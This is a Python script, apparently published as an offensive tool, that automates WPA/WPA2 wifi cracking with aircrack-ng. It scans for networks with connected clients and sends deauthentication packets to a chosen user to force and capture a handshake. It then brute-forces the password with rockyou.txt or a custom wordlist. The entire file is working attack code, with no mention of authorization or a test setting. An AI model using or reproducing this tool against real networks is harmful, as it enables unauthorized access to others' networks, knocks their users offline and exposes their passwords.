#!/usr/bin/env python3

# This script automates wifi cracking process using poplular linux utilities
# Supports WPA and WPA2
# Tested on Kali-linux

import os
import sys
import subprocess
import time
from datetime import datetime
import multiprocessing

check_monitor_mode = False
monitor_interface_name = ''
last_modified_wifi_interface = ''
wifi_cracker_directory = ''
present_network_file_no = 0
scan_performed = False
deauth_attack_performed = False
cracked_networks = []


def check_for_required_packages():
    global wifi_cracker_directory

    # Utilities required: aircrack-ng
    print('\x1b[93m'+'\n[*] Checking for required packages...')
    check_for_aircrack = subprocess.run(['apt-cache', 'policy', 'aircrack-ng'], capture_output=True, text=True)
    if 'Installed' in check_for_aircrack.stdout:
        pass
    else:
        print('\n[*] Installing aircrack-ng...')
        install_result = subprocess.run(['sudo', 'apt-get', 'install', '-y', 'aircrack-ng'], text=True)
        if install_result.returncode == 0:
            print('\x1b[92m' + "[+] Aircrack-ng installed")
            print('[+] All packages installed')
            return
        else:
            print('\x1b[91m'+"[-] Failed to install Aircrack-ng.")
            exit()
    
    print('\x1b[92m' + "[+] Aircrack-ng installed")
    print('[+] All packages installed')

    wifi_cracker_directory = './wifi_cracker_' +  datetime.now().strftime("%D").replace('/','_') + '/'

def scan_networks():
    global check_monitor_mode
    global monitor_interface_name
    global wifi_cracker_directory
    global present_network_file_no
    global scan_performed

    scan_networks_file = wifi_cracker_directory+"network_scan"
    no_of_network_files_found = 0

    if check_monitor_mode == False:
        print('\x1b[91m'+"[-] Please enable monitor mode and try again")
        return
    
    if os.path.isdir(wifi_cracker_directory):
        pass
    else:
        os.mkdir(wifi_cracker_directory)

    if len(os.listdir(wifi_cracker_directory)) != 0:
        for file in os.listdir(wifi_cracker_directory):
            if 'network_scan' in file:
                no_of_network_files_found += 1
        present_network_file_no = no_of_network_files_found + 1

    print('[*] Starting scan (Press CNTRL+C to stop scanning after the required data has being captured)...')
    time.sleep(4)
    # sudo airodump-ng --output-format csv,pcap --write scan_networks <monitor_interface>
    subprocess.run(['sudo', 'airodump-ng', '--output-format', 'csv', '--write', scan_networks_file, monitor_interface_name], text=True)
    scan_performed = True
    print('\x1b[93m'+'[*] Returning to Main Menu...')
    time.sleep(2)
    

def attack_a_network():
    global wifi_cracker_directory
    global present_network_file_no
    global scan_performed
    global deauth_attack_performed
    global cracked_networks

    network_name_and_address = {}  # Store WPA/WPA2 extracted networks from last scan
    network_addresses_and_clients = {}  # Store extracted networks that have at least a user connected to them
    network_name_and_channel = {}

    if scan_performed == False:
        print('\x1b[91m'+'[-] Please perform a scan and try again')
        return

    print('\n[*] Extracting data from last scan...')
    if len(str(present_network_file_no)) == 1:
        if present_network_file_no == 0:
            file_to_get = wifi_cracker_directory+'network_scan-01.csv'
        else:
            file_to_get = wifi_cracker_directory+'network_scan-0'+str(present_network_file_no)+'.csv'
        file =  open(file_to_get, 'r')
        contents = file.readlines()
        file.close()
    else:
        file_to_get = wifi_cracker_directory+'network_scan-'+str(present_network_file_no)+'.csv'
        file = open(file_to_get, 'r')
        contents = file.readlines()
        file.close()
    
    # get network name and address from previous scan which make use of WPA/WPA2 encryption
    net_name_address_breaker = False
    collect_data = False
    # wpa_counter = 0
    for line in contents:
        if net_name_address_breaker == True:
            break
        if 'bssid' and 'essid' in line.lower():
            counter = 0
            for value in line.lower().split(','):
                if 'bssid' in value:
                    bssid_locator = counter
                if 'essid' in value:
                    essid_locator = counter
                if 'privacy' in value:
                    wpa_counter = counter
                if 'channel' in value:
                    channel_no = counter
                counter +=1
            collect_data = True
            continue
        if collect_data:
            if len(line) == 1:
                net_name_address_breaker == True
                continue
            else:
                network_name = line.split(',')[essid_locator].strip()
                network_address = line.split(',')[bssid_locator].strip()
                encryption_used = line.split(',')[wpa_counter].strip()
                channel_used = line.split(',')[channel_no].strip()
                counter =  1
                if ('wpa' in encryption_used.lower()) and (encryption_used.lower().strip() != 'wpa3'):
                    if len(network_name) == 0:
                        network_name_and_address['No-Name_' + str(counter)] = network_address
                        network_name_and_channel['No-Name_' + str(counter)] = channel_used
                        counter += 1
                    else:
                        network_name_and_address[network_name] = network_address
                        network_name_and_channel[network_name] = channel_used
    

    # get clients connected to networks that have being extracted (WPA/WPA2 networks)
    collect_data = False
    station_locator = 0
    essid_locator = 0
    breaker = False
    for line in contents:
        if breaker == False:
            if 'probed essids' in line.lower():
                counter = 0
                for value in line.lower().split(','):
                    if 'station' in value:
                        station_locator = counter
                    if 'essid' in value:
                        essid_locator = counter
                    counter += 1
                collect_data = True
                breaker = True
                continue
        if collect_data:
            if len(line) == 1:
                break
            
            client_address = line.split(',')[station_locator].strip()
            network_address = line.split(',')[essid_locator].strip()
            if len(network_address) != 17:
                network_address = line.split(',')[essid_locator-1].strip()
            for key, value in network_name_and_address.items():
                if network_address in value:                     
                    try:
                        network_addresses_and_clients[network_address].append(client_address)
                    except:
                        network_addresses_and_clients[network_address] = []
                        network_addresses_and_clients[network_address].append(client_address)

    # print("\n[*] All networks that support WPA/WPA2 with their addresses:")
    # print(network_name_and_address)
    # print('[*] Extracted networks with their connected users (only networks with at least a connected user):')
    # print(network_addresses_and_clients)

    # Extract exploitable networks (WPA/WPA2 supported networks with at least a user connected to them)
    attackable_networks = []
    for key, value in network_addresses_and_clients.items():
        for key1, value1 in network_name_and_address.items():
            if key in value1:
                attackable_networks.append(key1)
    
    if len(attackable_networks) == 0:
        print('[*] No Exploitable Networks Found')
        return
    else:
        print("[*] Exploitable Networks found (Supports WPA/WPA2 with at least a user connected to them): \n")
        counter = 1
        for attackable_network in attackable_networks:
            print('\x1b[94m'+' (' + str(counter) + ') ' + attackable_network)
            counter += 1

    breaker = True
    # selected_network_no = 0
    while breaker:
        network_no = input('\x1b[93m'+'\n[*] Select a network (enter network no or Type "back" to return to main menu): ')
        try:
            network_no = int(network_no)
            selected_network = attackable_networks[network_no-1]
            selected_network_address = network_name_and_address[attackable_networks[network_no-1]]
            # selected_network_no = network_no
            try:
                # print("\n[*] Network selected: " + selected_network)
                breaker = False
            except:
                print('\x1b[91m'+'[-] Invalid no')
                print('\x1b[93m'+'[*] Exploitable networks found: \n')
                counter = 1
                for attackable_network in attackable_networks:
                    if 'No-Name' in attackable_network:
                        print('\x1b[94m'+' (' + str(counter) + ') ' + attackable_network + ' -- ' + network_name_and_address[attackable_network])
                        counter += 1
                    else:
                        print('\x1b[94m'+' (' + str(counter) + ') ' + attackable_network)
        except:
            network_no = str(network_no)
            if network_no.lower() == "back":
                return
            else:
                print('\x1b[91m'+'[-] Invalid no')
                print('\x1b[93m'+'[*] Exploitable networks found: \n')
                counter = 1
                for attackable_network in attackable_networks:
                    print('\x1b[94m'+' (' + str(counter) + ') ' + attackable_network)
                    counter += 1
    
    # Get mac-address of selected network and begin attack:
    if len(network_addresses_and_clients[selected_network_address]) == 1:
        user_selected = network_addresses_and_clients[selected_network_address][0]
        print('[*] Only one user is connected to ' + selected_network)
        # collect no of deauth packets to send to network
        while True:
            no_deauth_packets = input('\x1b[93m'+"[*] Enter the no of deauth packets btwn 1-10000 to send to the network (This depends on the distance btwn you and the network): ")
            try:
                no_deauth_packets = int(no_deauth_packets)
                if no_deauth_packets in range(1, 10001):
                    break
                else:
                    print('\x1b[91m'+"[-] Invalid no\n")
            except:
                print('\x1b[91m'+"[-] Invalid no\n")
        print('\n[*] Network selected: ' + selected_network + ':' + selected_network_address)
        print('[*] User selected: ' +  user_selected)
        print('[*] Starting De-auth Attack (Press CNTRL+C to stop attack once handshake has been captured)...')
        time.sleep(7)
    else:
        print('[*] Multiple users are connected to ' + selected_network)
        while True:
            print('\n[*] Users connected to ' + attackable_networks[network_no-1] + ' are:\n')
            counter = 1
            for user in network_addresses_and_clients[network_name_and_address[attackable_networks[network_no-1]]]:
                print('\x1b[94m'+' (' + str(counter) + ') User_'+str(counter) + ' :' + user)
                counter += 1
            user_no = input('\x1b[93m'+'\n[*] Select a user (enter user no): ')
            try:
                user_no = int(user_no)
                user_selected = network_addresses_and_clients[selected_network_address][user_no - 1]
                while True:
                    no_deauth_packets = input('\x1b[93m'+"[*] Enter the no of deauth packets btwn 1-10000 to send to the network (This depends on the distance btwn you and the network): ")
                    try:
                        no_deauth_packets = int(no_deauth_packets)
                        if no_deauth_packets in range(1, 10001):
                            break
                        else:
                            print('\x1b[91m'+"[-] Invalid no\n")
                    except:
                        print('\x1b[91m'+"[-] Invalid no\n")
                print('\n[*] Network selected: ' + selected_network + ':' + selected_network_address)
                print('[*] User selected: ' + user_selected)
                print('[*] Starting De-auth Attack (Press CNTRL+C to stop attack once handshake has been captured)...')
                time.sleep(8)
                break
            except:
                print('\x1b[91m'+'[-] Invalid user no')
    
    network_channel = network_name_and_channel[selected_network]
    write_out_file = wifi_cracker_directory+selected_network.replace(" ", "_")
    
    # Commands for the attack
    network_attack_command = 'sudo airodump-ng --bssid ' + selected_network_address + ' --channel ' + network_channel + ' --write ' + write_out_file + ' --output-format cap ' + monitor_interface_name + " True"
    deauth_command = 'sudo aireplay-ng --deauth ' + str(no_deauth_packets) + ' -a ' + selected_network_address + ' -c ' + user_selected + ' --ignore-negative-one ' + monitor_interface_name + " False"

    network_attack = multiprocessing.Process(target=run_command, args=[network_attack_command])
    deauth_attack = multiprocessing.Process(target=run_command, args=[deauth_command])

    network_attack.start()
    deauth_attack.start()
    network_attack.join()

    deauth_attack_performed = True
    if selected_network.replace(" ", "_") not in cracked_networks:
        cracked_networks.append(selected_network.replace(" ", "_"))
    print('\x1b[93m'+'[*] Attack Performed. Returning to Main menu...')
    time.sleep(2)
            
def run_command(commands):
    if "True" in commands:
        commands = commands.replace(" True", "")
        subprocess.run(commands, shell=True)
    else:
        commands = commands.replace(" False", "")
        subprocess.run(commands.split(' '), capture_output=True)
        


def crack_handshake():
    global deauth_attack_performed
    global wifi_cracker_directory
    global cracked_networks
    c_a_n = False # crack_attacked_networks
    cap_file = False # captured file

    files_found = []

    while True:
        print('\n'+'\x1b[94m'+' (1) Crack attacked networks')
        print('\x1b[94m'+' (2) Crack captured network file')
        action = input('\x1b[93m' + '\n[*] Select an option (enter option no): ')
        try:
            action = int(action)
            if action == 1:
                c_a_n = True
                break
            elif action == 2:
                cap_file = True
                break
            else:
                print('\x1b[91m' + "[-] Invalid option")    
        except:
            print('\x1b[91m' + "[-] Invalid option")

    if c_a_n:
        if deauth_attack_performed == False:
            print('\x1b[91m'+'[-] Please perform an attack and try again')
            print('\x1b[93m'+'[*] Returning to Main menu...')
            return
        
        directory_contents = os.listdir(wifi_cracker_directory)

        for network_cracked in cracked_networks:
            for file in directory_contents:
                if network_cracked in file:
                    files_found.append(network_cracked)
                    break
        if len(files_found) == 0:
            print('\n[*] No Attacked Network Files found: ')
            print('[*] Returning to Main Menu...')
            time.sleep(2)
            return
        else:
            while True:
                counter = 1
                print('\x1b[93m'+'[*] Attacked Networks Found:\n')
                for file in files_found:
                    print('\x1b[94m'+' (' + str(counter) + ') ' + file)
                    counter += 1
                network_to_crack = input('\x1b[93m'+'\n[*] Enter a network no or "back" to return to Main Menu [Note: This only works if the handshake was captured during the attack] : ')
                try:
                    network_to_crack =  int(network_to_crack)
                    network_selected = files_found[network_to_crack-1]
                    break
                except:
                    network_to_crack = str(network_to_crack)
                    if network_to_crack.lower() == "back":
                        return
                    else:
                        print('\x1b[91m'+'[-] Invalid no')
            
            no_of_nework_files_found = 0
            for file in directory_contents:
                if network_selected in file:
                    no_of_nework_files_found += 1

            # Set file name
            if no_of_nework_files_found <= 9:
                file_to_crack = wifi_cracker_directory+network_selected+'-0'+str(no_of_nework_files_found)+'.cap'
            else:
                file_to_crack = wifi_cracker_directory+network_selected+'-'+str(no_of_nework_files_found)+'.cap'

            get_rockyou_path = subprocess.run(['locate', 'rockyou.txt'], capture_output=True, text=True)
            paths_returned = get_rockyou_path.stdout.splitlines()
            found = False
            for line in paths_returned:
                if 'rockyou.txt' in line:
                    print('\x1b[92m'+'[+] rockyou.txt found')
                    path = line
                    found = True
                    break
            if found == False:
                print('\x1b[91m'+'[-] rockyou.txt not found')
            
            crack_with_custom_dict = False
            if found:
                while True:
                    crack_with_rockyou = input('\x1b[93m'+'\n[*] Do you want to crack with rockyou.txt (Y/N): ')
                    if crack_with_rockyou.lower() == 'y':
                        # Crack File
                        print("\n[*] Network selected: " + network_selected)
                        print("[*] Cracking last attack on " + network_selected + ' with rockyou.txt')
                        print('\x1b[92m')
                        time.sleep(3)
                        subprocess.run(['sudo', 'aircrack-ng', file_to_crack, '-w', path], text=True)
                        break
                    elif crack_with_rockyou.lower() == 'n':
                        crack_with_custom_dict = True
                        break
                    else:
                        print('\x1b[91m'+'[-] Invalid option')
                        continue
            
            if (crack_with_custom_dict == True) or (found == False):
                while True:
                    get_custom_dict = input('\x1b[93m'+'\n[*] Enter path to dictionary: ')
                    verify_path = os.path.isfile(get_custom_dict)
                    if verify_path:
                        print("\n[*] Network selected: " + network_selected)
                        print("[*] Cracking last attack on " + network_selected + ' with ' + get_custom_dict.split('/')[-1])
                        print('\x1b[92m')
                        time.sleep(3)
                        subprocess.run(['sudo', 'aircrack-ng', file_to_crack, '-w', get_custom_dict], text=True)
                        break
                    else:
                        print('\x1b[91m'+'[-] The Path provided is not valid')
                        

            print('\x1b[93m'+'[*] Returning to Main menu...')
            time.sleep(2)

    if cap_file:
        while True:
            network_file_path = input('\x1b[93m'+'\n[*] Enter path to network file [.cap, .pcap, .hccapx]: ')
            verify_net_file_path = os.path.isfile(network_file_path)
            if verify_net_file_path:
                break 
            else:
                print('\x1b[91m'+'[-] The Path provided is not valid')
        
        # Find rockyou.txt
        get_rockyou_path = subprocess.run(['locate', 'rockyou.txt'], capture_output=True, text=True)
        paths_returned = get_rockyou_path.stdout.splitlines()
        found = False
        for line in paths_returned:
            if 'rockyou.txt' in line:
                print('\x1b[92m'+'[+] rockyou.txt found')
                path = line
                found = True
                break
        if found == False:
            print('\x1b[91m'+'[-] rockyou.txt not found')

        crack_with_custom_dict = False
        if found:
            while True:
                crack_with_rockyou = input('\x1b[93m'+'\n[*] Do you want to crack with rockyou.txt (Y/N): ')
                if crack_with_rockyou.lower() == 'y':
                    # Crack File
                    print("\n[*] File selected: " + network_file_path.split('/')[-1])
                    print("[*] Cracking " + network_file_path.split('/')[-1] + ' with rockyou.txt')
                    print('\x1b[92m')
                    time.sleep(3)
                    subprocess.run(['sudo', 'aircrack-ng', network_file_path, '-w', path], text=True)
                    break
                elif crack_with_rockyou.lower() == 'n':
                    crack_with_custom_dict = True
                    break
                else:
                    print('\x1b[91m'+'[-] Invalid option')
                    continue
        
        if (crack_with_custom_dict == True) or (found == False):
            while True:
                get_custom_dict = input('\x1b[93m'+'\n[*] Enter path to dictionary: ')
                verify_path = os.path.isfile(get_custom_dict)
                if verify_path:
                    print("\n[*] File selected: " + network_file_path.split('/')[-1])
                    print("[*] Cracking " + network_file_path.split('/')[-1] + ' with ' + get_custom_dict.split('/')[-1])
                    print('\x1b[92m')
                    time.sleep(3)
                    subprocess.run(['sudo', 'aircrack-ng', network_file_path, '-w', get_custom_dict], text=True)
                    break
                else:
                    print('\x1b[91m'+'[-] The Path provided is not valid')

        print('\x1b[93m'+'[*] Returning to Main menu...')
        time.sleep(2)


def enable_disable_monitor_mode():
    global check_monitor_mode
    global monitor_interface_name

    interface_locator = 0

    if check_monitor_mode == True:
        print("[*] Monitor mode is enabled on: " + monitor_interface_name)
        print("[*] Disabling monitor interface...")
        disable_monitor_mode = subprocess.run(['sudo', 'airmon-ng', 'stop', monitor_interface_name], text=True, capture_output=True)
        check_interfaces = subprocess.run(['sudo', 'airmon-ng'], capture_output=True, text=True)
        if monitor_interface_name not in check_interfaces.stdout:
            print('\x1b[92m'+"[+] Monitor mode disabled")
            check_monitor_mode = False
        else:
            print('\x1b[91m'+"[-] Disabling monitor mode failed")
    else:
        print("\n[*] Checking for available wifi interfaces...")
        available_interfaces = []
        check_interfaces = subprocess.run(['sudo', 'airmon-ng'], capture_output=True, text=True)

        # Get interface no locator in data
        breaker = False
        for line in check_interfaces.stdout.splitlines():
            if breaker == True:
                break
            if 'Interface' in line:
                for value in line.split('\t'):
                    if 'Interface' in value:
                        breaker = True
                        break
                    else:
                        interface_locator += 1


        for line in check_interfaces.stdout.splitlines():
            if 'phy' in line:
                available_interfaces.append(line.split('\t')[interface_locator])

        if len(available_interfaces) == 0:
            print('\x1b[91m'+"[-] No Monitor supported wifi interfaces found")
            print('\x1b[91m'+"[-] You can only use this tool if your wifi card supports Monitor mode")
            print('\x1b[93m'+"[*] Exiting...")
            os._exit(0)

        print('[*] Available wifi interfaces:\n')
        interface_counter = 1
        for interface in available_interfaces:
            print('\x1b[94m'+' [' + str(interface_counter) + ']' + ' ' + interface)
            interface_counter += 1

        if len(available_interfaces) == 1:
            interface_name = available_interfaces[0]
            print('\x1b[93m'+'\n[*] Enabling monitor mode...')
            enable_monitor_mode = subprocess.run(['sudo', 'airmon-ng', 'start', interface_name], text=True, capture_output=True)
            if enable_monitor_mode.returncode == 0:
                check_monitor_mode = True

                # Set global present monitor interface name
                check_interfaces = subprocess.run(['sudo', 'airmon-ng'], capture_output=True, text=True)
                for line in check_interfaces.stdout.splitlines():
                    if interface_name in line:
                        monitor_interface_name =  line.split('\t')[interface_locator]
                print('\x1b[92m'+'[+] Monitor mode enabled on interface ' + monitor_interface_name)
            else:
                print('\x1b[91m'+'[-] Enabling monitor mode failed')
        else:
            while True:
                int_name = input('\x1b[93m'+'\n[*] Enter an interface name (Type "back" to return to main menu): ')
                if int_name.lower() == "back":
                    return
                if int_name in available_interfaces:
                    print('[*] Enabling monitor mode...')
                    enable_monitor_mode = subprocess.run(['sudo', 'airmon-ng', 'start', int_name], text=True, capture_output=True)
                    if enable_monitor_mode.returncode == 0:
                        check_monitor_mode = True
                        check_interfaces = subprocess.run(['sudo', 'airmon-ng'], capture_output=True, text=True)
                        for line in check_interfaces.stdout.splitlines():
                            if int_name in line:
                                monitor_interface_name =  line.split('\t')[interface_locator]
                        print('\x1b[92m'+'[+] Monitor mode enabled on interface ' + monitor_interface_name)
                    else:
                        print('\x1b[91m'+'[-] Enabling monitor mode failed')
                    break
                else:
                    print('\x1b[91m'+'[-] Wifi interface does not exist. Please select a valid interface')
                    print('\x1b[93m'+'[*] Available wifi interfaces:\n')
                    interface_counter = 1
                    for int in available_interfaces:
                        print('\x1b[94m'+' [' + str(interface_counter) + ']' + ' ' + int)
                        interface_counter += 1


def main():
    if sys.platform != 'linux':
            print("[-] Please run on a linux machine (Kali Linux)")
            exit()
    
    wifi_cracker ='\x1b[96m'+"""
██╗    ██╗██╗███████╗██╗       ██████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗ 
██║    ██║██║██╔════╝██║      ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
██║ █╗ ██║██║█████╗  ██║█████╗██║     ██████╔╝███████║██║     █████╔╝ █████╗  ██████╔╝
██║███╗██║██║██╔══╝  ██║╚════╝██║     ██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
╚███╔███╔╝██║██║     ██║      ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
 ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝       ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                               coded by blacree (supports wpa/wpa2)
    """

    print(wifi_cracker)

    # check if aircrack-ng package is installed
    check_for_required_packages()

    usage = '\x1b[94m' + """
    (1) SCAN/RE-SCAN NETWORKS
    (2) ATTACK A NETWORK (CAPTURE HANDSHAKE)
    (3) CRACK CAPTURED_HANDSHAKE/NETWORK_FILE (USES rockyou.txt BY DEFAULT)
    (4) ENABLE/DISABLE MONITOR MODE"""
    print(usage)

    while True:
        action = input('\x1b[93m' + '\n[*] Select an option (Type "options" to view the available options and "exit" to quit): ')
        try:
            action = int(action)           
            if action == 1:
                scan_networks()
            elif action == 2:
                attack_a_network()
            elif action == 3:
                crack_handshake()
            elif action == 4:
                enable_disable_monitor_mode()
            else:
                print('\x1b[91m' + "[-] Invalid option")
        except:
            if action.lower() == 'exit':
                if check_monitor_mode == True:
                    enable_disable_monitor_mode()
                exit()
            elif action.lower() == 'options':
                print(usage)
            else:
                print('\x1b[91m' + "[-] Invalid option")

    # enable_disable_monitor_mode()

if __name__ == "__main__":
        main()
